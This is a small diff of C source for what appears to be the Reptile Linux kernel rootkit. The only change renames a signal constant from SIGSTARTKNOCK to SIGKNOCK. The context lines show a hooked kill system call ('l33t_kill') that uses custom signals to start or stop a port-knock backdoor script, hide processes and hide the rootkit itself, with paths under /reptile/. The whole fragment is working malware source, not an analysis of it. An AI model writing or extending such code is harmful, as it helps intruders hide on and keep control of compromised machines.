@@ -31,7 +31,7 @@
 #define HEAVENSDOOR 	"/reptile/heavens_door"
 #define START 		"/reptile/start.sh"
 #define KILLDOOR 	"/reptile/kill_door.sh"
-#define SIGSTARTKNOCK 	48
+#define SIGKNOCK 	48
 #define SIGHIDEPROC 	49
 #define SIGHIDEREPTILE 	50
 #define HIDE 		"reptile"
@@ -211,7 +211,7 @@ asmlinkage int l33t_kill(pid_t pid, int sig){
 
 			task->flags ^= 0x10000000;
 			break;
-		case SIGSTARTKNOCK:
+		case SIGKNOCK:
 			if(knockon) {
 				start_bin_from_userland(KILLDOOR);
 				knockon = 0;
